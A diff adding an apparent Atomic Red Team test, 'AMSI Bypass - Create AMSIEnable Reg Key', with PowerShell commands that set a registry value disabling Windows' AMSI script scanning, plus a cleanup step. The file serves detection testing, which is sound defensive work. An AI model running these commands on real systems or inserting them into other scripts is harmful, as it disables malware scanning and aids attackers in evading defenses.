@@ -1136,3 +1136,18 @@ atomic_tests:
       Write-Host "Registry value deleted: $newValueName"
     name: powershell
     elevation_required: true
+- name: AMSI Bypass - Create AMSIEnable Reg Key
+  auto_generated_guid: 728eca7b-0444-4f6f-ac36-437e3d751dc0
+  description: |
+    Threat Actor could disable the AMSI function by adding a registry value name “AmsiEnable” to the registry key “HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable” and set its value to 0.
+    Ref: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      New-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Force | Out-Null
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Name "AmsiEnable" -Value 0 -PropertyType DWORD -Force | Out-Null
+    cleanup_command: |
+      Remove-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Recurse -Force 2> $null
+    name: powershell
+    elevation_required: true
